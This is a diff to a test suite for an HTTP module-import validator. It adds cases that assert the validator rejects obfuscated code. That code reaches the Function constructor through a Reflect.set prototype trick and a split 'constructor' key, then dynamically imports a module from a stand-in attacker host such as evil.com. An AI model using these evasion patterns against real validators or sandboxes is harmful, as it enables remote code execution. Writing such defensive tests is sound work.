@@ -591,6 +591,18 @@ describe("routing/api/module-loader/http-validator", () => {
       await assertRejects(
         async () =>
           await validateHTTPImports(
+            `const holder = {}; Reflect.set({}, "__proto__", () => {}, holder);` +
+              ` const make = holder.constructor;` +
+              ` make('return import("https://evil.com/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "Reflect.set applies the inherited prototype setter to its explicit receiver",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
             `const source = Object.defineProperty({}, "__proto__", {` +
               ` value: () => {}, enumerable: true });` +
               ` const holder = {}; Object.assign(holder, source);` +
@@ -673,6 +685,18 @@ describe("routing/api/module-loader/http-validator", () => {
         Error,
         "dynamic code generation",
         "a function declaration binding carries the same constructor property",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `import helper from "./helper.ts";` +
+              ` const key = ["con", "structor"].join("");` +
+              ` helper[key]('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "an imported value may be callable even though its initializer is in another module",
       );
       await validateHTTPImports(
         `const table = { safe: "ok" }; const key = computeKey();` +
